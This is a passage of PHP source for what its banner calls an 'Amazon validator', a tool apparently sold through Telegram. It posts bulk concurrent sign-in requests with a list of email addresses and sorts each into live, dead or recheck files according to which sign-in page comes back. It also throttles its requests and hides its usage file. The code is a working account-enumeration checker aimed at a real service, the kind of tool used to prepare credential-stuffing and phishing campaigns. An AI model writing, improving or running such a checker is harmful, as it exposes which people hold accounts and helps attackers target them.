TcG1LQEO4EEQp1GoP4mqPcOB3rb40DlqR%2FuMFFZ7QPFFyjA9usZZ9YGMYSS9Jedam2CG7URY47lNPm2Rsa2ayr5gv6DNX7J4RzSIwagQgjwB9bBXz6Hg3mmq4XybWsy3T4i0MA3MbNJJgNjS4quL3NljxXU48Qpig9CEDY%2FfTGCwXJ1sdEcOimgnFGaezbzVuN%2Bnkb8Pkert19fX6Sfd2RerZRtkxZ%2Bsjl547irzSTfVW7HW8dvzxZnXjGxC9Yr0zDA%2BGG27P2lt4Huos%2FcOyDa52h6N%2FeyON5IF%2F0cwdnAct6ZGfPjlSwkdgupB2C2U8i6vDkErikl0fBeoGTiE4uZPsPW9ISLOSJlluuSnnmpcE1ziwPDfFo0JOpmaHEDj4kN9SewX3aKGxxS%2FU8%2Fgkzt6rghM8ycpNWkESfqO47jq6OQqPVqu9CXWnqNEA7gdjdUmnkxaZZIYwtPbO7sBIN4VDzin5uA4300bGooxRNay203dRk1W6dKu5EjCWTkSDM4RIcDkfHcfM64LfwKHeS46QXxOj%2BbGWDeBaooPACo%2FAgsMgkegPpsacLWqmLhAaheAL5Lz%2BH7nqn0l%2BaqE69KkAUCIL7KtIhaPtFcko%2Fb6zqsml27pCq91RANTV5F1%2BaHTipu2lcap3qpFuUWOfkSr1AB30NLULmahGdVWECeIqccvs47X2noHsRNv4ygCfUNC%2BrX06Rh6etbHRMEgsMtiqEY8w8%2Fh3gTDe5OI4Q05Z6pxN7%2BpRxpGASzz%2FfHMlmAb%2BqocXCxH3FeSY%2FlqwbvnGZoUUSkcIvm0XdYKJ%2Bp7uQd6%2BQ3ypXDwcB1dC%2FZUgLZiEq3JElzvwFBbDXb6YE%2BR0t%2F3OZTMKehuu3xDbcQbYNAwTADrHvrY%2FmbX8ilCK3%2FXrViQYeqm2kjVfjRJy3bn89jNih%2F%2B3IZMBVcm5oglmab7Q%2Bc%2FcTaoz%2BrqVQ0mLKGEfoo3wNEFo%2FCjqe7W86oD8dcM%2FeLrroecT2YaZETgx3dsRoI6ruRkMkRiqFui9Vi9KHCnrFPd9qEbC%2BRMVmcHyiwkQMAZaytNhHVTMA%2Fb0djVcjVxfgOZlYyq6vOzFiwD21EV8U2eZNtuSwEe8YXQnq6vwQX84cXjSP9PlX8NQr5V3dHlzMEb%2BRJHThRwxAwfiPqgB3ouHAyY6H3RVRyUPelEGZ4DEQLggBvCwMs3%2BsaD70fTElhWVKhpS1Agxq4UejTN7RcYMnCbVQJzGdDZu568wtm%2BT8%2FduAaCsg%2BVQREu36CAX72g6gTM0T0IV51%2Btxgl4%2F7p4wprgTBSGOb48kLjK5csmeSKDmX4x%2Bk4TH09uHeXEtIYzz6SM5bWR7hanQ4W%2BlfeR9YpTRkeN8qt5Drzud84t3k66nGq2MeRHz7Av%2F7JYEcMVAaqHiEtD0zOJsQloAZfjwZpfjrvhBHPDWAyG4NqKTZpv6xBnUmHGGUnqX5vSt05l1tJ5sdXIFuZCkuJBfqAeJ3kBQ2i%2BWJSLw7cLcTuLhVRYvkYdkXNHMU71jHqNqKAVaYQVdHZlhqqXiDGKqsPJVqbROSTUWKTsiujqdYzQMbjHKmCn5BUQ6TjwBk4UxRVGH37cALEJYgXCpvwKQXEu5WUnxzHAgxntxZix9xU4z4W3MbF0xXiTB3UUCOWJgWf7iqGk3cn5W6zL%2BLuozSbFgi7IXNKf6iF07QIvSW02i%2F27p65J2%2FMw%2FcBNQvtaVpff0pq7pHpTQjwBKu2n%2BbTGzmp2lLU0l%2F75L9na6GxrQRgD%2FUcoQJg3Oo9bYq5l3RyT%2FYAHFKpEIbHm%2BepB142EUmLSGium2KboMiTu3Cj0JwAftAuBIR53w5y7cl2nQNSmfFbsU0AbRHtCHVqdutypDbwfFC9z%2FaCN5Iq%2BBNTSxo%2B%2FFfgZgW39Wu74qni%2BMDiFAeBGQo2cK7hDLIv%2BnEhNs3PlHtGcLVyR%2BHyNdqmwDrAxjWPOhG5uIdNNkkjVjxwGO73Ir63%2B%2FXGNNhkoUpauBII919hmfLJMIbNY3p3QTx92hXAjdEH1bhmQgFwEvg2uwDn7sD3y8E8eJF88sDa4EnKbfbCaONOXBU9tBlvrXrQbdQ8oRZ7E32AgcAbDq7MtCmiCcSYaaRwdmyF4TZEgW%2FQn1htsqP%2Fgf6vLtS90NiIcTDpDBRl%2F8dqPTcWH9XcIYQPvhBbYR3MNpsL62Ru1z0vXIBmBSRTP7X1RpDxbIYb9yVqj7kF6ErrhIGDaekcq9xY7P%2FLspDCx8vXuwydmroZ6unX3NE%2FnMc50J8SC390zz7%2BOcGsgFbiX5t%2BgimNuzRFXo25hz4jCgjztFvyfzRZBeD1V6UsgHc87dD8afVevtPyHuix2uD35qTIe32G6esT2iKKDSI%2BZfQwOyYZVWWx6UjcuWg50Ft2UhGmXrss3IvM%2Fw7Y5oidmHRtI8rX4qTJYEfSASabRJiU8hTjztf2uZBPBZYflNuBiKo1HGDZFa0DRHMSbIykzFtyfdid%2FQOaHJOgVMvzF7xqd1ydjvNAl9FXd0EQ9KGfbI3jnfGc5EYANsHLj%2BxNurClT2fMYL%2Fw9WHsWLcoLhpgBIQSaVFq6eXfi8oId955zt3rvVzO5sQKRF2djHgFCd9OZMSdA3fFBVgS%2FjfTOIb68ZDsp25aaEtsfZJgRUAuCj4tnEnlnBS%2F5iA7PqhOeJuzy%2BWqnuOsFVZPuD4aosjAtdzau6GPeJZ6pLZ%2BErIc37q6wA0CRuJm9vNCSo06yNZcl8SWzi5t3yImx3BaqeUVmgxD5pn9QcSnj%2BNR%2FQ1z26BQUdEpFd609seydLn0prmflFulvktoatLKUPvqlD3aQxQh2%2Bd4GVTP3IsBqCfI9wHNIL1Lhq7JDbYmu4BdIl8GxPqSjewEWb4RTG5CVZTHKYTc3ZiJ22EpyTJyjFwRLhmPDn%2FR7%2F52ZCgazlkhX6MlgNSuKM9lMQ1dnfCDQL%2Bt1y1Kao0uhDaHZy55Nnoc3KlfFj0G808Rk6X6M1exLFn4OBd8J571tJNaUQe8ONtfVwAWa%2BuwG136IG6Cx4wEIUdvUtQElkL%2FP6bJSWJg0HT5RR45gUxtiahHJyqRun3n27Vd2yhANnPetWQCwsjj0alL4Urd1oag%2BRFyIxDjzijHdvbQdI8d9Q7jC9RhAoSB0o%2Bfv8kE09J7brAOtllKwVEZw8FkKVImNCuS1g9gWhTpcbkNeBnIPwi%2FXlK7gKDA%2BeuZR68JGOAYTu6dOcNyNahjtYIAquJPjrQ0jagcvbaBOfAv3QTj5Sj2ouYzjc%2B0sRqnlosGIRowelfc5dn3gKcHvHzLC%2F33wANLYS3TNoIRfbKrq6u31svDXK9dK2vvuTF3Suj6Jggh%2BYt3wZIZDk9dqsZ9pCkK30QsJkJOKIlh6oa%2FXJ7AmcriKgAc976%2BY1BjX70mIHt3e9839FWStRLsenzP9%2BGxl70TMEBCyMJ7UtG6Gqs7fwUXzGlc13ZgCHDOuAx%2FMxgWwgDowzPSE4v6JrCcWTIIDMn8ZY4ldDRFzNfHEoJrkZgxwOYQNo7%2FQJN2%2Bpjo8VaZgfZ9PESf0WRi0Y5FZDjmDQ5HWR8qT2lNHRd%2B6WPij80QHt37umIP8e%2BvzzN2ilO8eKahBnj9OvffbqLlQRIpyufkQwJcdxj4xsh5R5vlKiaikGoi3lrqRCXBLgdLKaM4eUGr8azW0wlgCCX6q%2B5AbOSQcdWIPEMZMbPnis3OGVyX47%2FHw0xSYt4TvtJSunnhnYUKGcsKqOHZfdw5EUzzvqT4Vo3zEFgjHIvEBUWJR1h%2BbtDv8EbcbfdpHhlUWFqGwmSMaFs9uDhNFTw%2BkGPLdUClkx1%2FdLAIZNnFXlvfy77Ln0C1PeitirmPoK50LfPGJnKL%2BBLuB2MU4sl%2FXbIRnmDP3i9WP3YyoU2Nw9zZquqcPcFqU5K%2Fb6obrhAHEwDcD9HSj4rLSLPj4hP1kagzt3FovBQ0Wc3c2unbR5EQ6JrErynaifE1nhFlvFPjKijgSuZxrLCIRF4EMfIl7HNWiqx8uOmoo7hatj%2BkTQFBzxy0G8qWshyHFdmGFPWHUpG%2FXizVEr8OrsOxTdCMDSNB%2BzSKIgYtB6TxeFEhXcZdg8ngWhZlqZlQMlsEBu%2FNS29BMj1wuYdkFZForT2UHL0kMcKt9R33CGKvJfkm5VmTVn6t8Zr1RtFza46j1nWs%2Fil36hJ%2BhCHmHkuPM9i8BU8EEU2BqGN6RkV8WRrQbclhvxEXG%2BgdQqE%3D&aaToken=%7B%22uniqueValidationId%22%3A%224a611211-4fad-4ea7-8448-5d1842aec3a4%22%7D";
        $rollingCurl->setOptions(array(
            CURLOPT_ENCODING => 'gzip',
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS => 2,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_DNS_CACHE_TIMEOUT => 0,
            CURLOPT_FRESH_CONNECT => true,
            CURLOPT_FORBID_REUSE => true
        ))
            ->post($url, $data, $headers);
    }
    $rollingCurl->setCallback(function (\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results)
    {
        static $lastRequestTime = null;
        if ($lastRequestTime !== null)
        {
            $elapsed = microtime(true) - $lastRequestTime;
            $minDelay = 0.1;
            if ($elapsed < $minDelay)
            {
                usleep(($minDelay - $elapsed) * 1000000);
            }
        }
        $lastRequestTime = microtime(true);
        global $listname, $dir, $no, $pecah, $totalLists, $live, $die, $recheck, $pisah;
        $no++;
        parse_str(parse_url($request->getUrl() , PHP_URL_QUERY) , $params);
        $x = $request->getResponseText();
        $email = urldecode($params['aio']);
        echo "[\033[95mAIO\033[35mAMZ\033[0m]-";
        echo '[' . date('H:i:s') . ']-';
        echo '[' . $no . '/' . $totalLists . "]-[L:\33[0;32m" . $live . "\033[0m" . "|D:\33[0;31m" . $die . "\033[0m" . "|R:\33[0;33m" . $recheck . "\033[0m" . ']';
        if (strpos($x, 'subPageType: "SignInClaimCollect"') !== false)
        {
            $die++;
            file_put_contents('die.txt', $email . PHP_EOL, FILE_APPEND);
            echo "\33[0;31m [DEAD] \033[0m" . '=> ' . $email;
        }
        elseif (strpos($x, 'subPageType: "SignInPwdCollect"') !== false)
        {
            $live++;
            file_put_contents('live.txt', $email . PHP_EOL, FILE_APPEND);
            echo "\33[0;32m [LIVE] \033[0m" . '=> ' . $email;
        }
        else
        {
            $recheck++;
            file_put_contents('recheck.txt', $email . PHP_EOL, FILE_APPEND);
            echo "\33[0;33m [RECHECK] \033[0m" . '=> ' . $email;
        }
        echo PHP_EOL;
    })->setSimultaneousLimit((int)$reqemail)->execute();
}
echo PHP_EOL . "\033[93m\033[1mChecking process is complete\33[0m\n\033[95mTO\033[35mTAL\033[0m   : " . $totalLists . " \n\33[0;32mLIVE    \033[0m" . ': ' . $live . " \n\33[0;31mDEAD    \033[0m" . ': ' . $die . " \n\33[0;33mRECHECK \033[0m: " . $recheck . " \n\033[93m\033[1mSaved to \"" . $todayDir . "\"\33[0m" . PHP_EOL;
if (file_exists($usageFile))
{
    exec('attrib +h ' . escapeshellarg($usageFile));
}
function banner()
{
    $out = "
\033[95m
   _____  .___________      ________                                 
  /  _  \ |   \_____  \    /  _____/______  ____  __ ________  ______ © 2025
 /  /_\  \|   |/   |   \  /   \  __\_  __ \/  _ \|  |  \____ \/  ___/ 
/    |    \   /    |    \ \    \_\  \  | \(  <_> )  |  /  |_> >___ \ \033[35m
\____|__  /___\_______  /  \______  /__|   \____/|____/|   __/____  >
        \/            \/          \/                   |__|       \/ 
\033[0m
TOOLS       : AMAZON VALIDATOR                  TELEGRAM        : t.me/leechaerin26
VERSION     : 2.6                               FACEBOOK        : fb.me/26leechaerin
AUTHOR      : RIN                               TELEGRAM GROUP  : t.me/AIOGroups

\033[91mNever buy tools other than via telegram.\033[0m
" . PHP_EOL;
    return $out;
}
function color()
{
    return array(
        'LW' => (OS == 'linux' ? "\e[1;37m" : '') ,
        'WH' => (OS == 'linux' ? "\e[0m" : '') ,
        'YL' => (OS == 'linux' ? "\e[1;33m" : '') ,
        'LR' => (OS == 'linux' ? "\e[1;31m" : '') ,
        'MG' => (OS == 'linux' ? "\e[0;35m" : '') ,
        'LM' => (OS == 'linux' ? "\e[1;35m" : '') ,
        'CY' => (OS == 'linux' ? "\e[1;36m" : '') ,
        'LG' => (OS == 'linux' ? "\e[1;32m" : '') ,
        'GRN' => (OS == 'linux' ? "\e[0;32m" : '') ,
        'LGRN' => (OS == 'linux' ? "\e[32;4m" : '')
    );
};

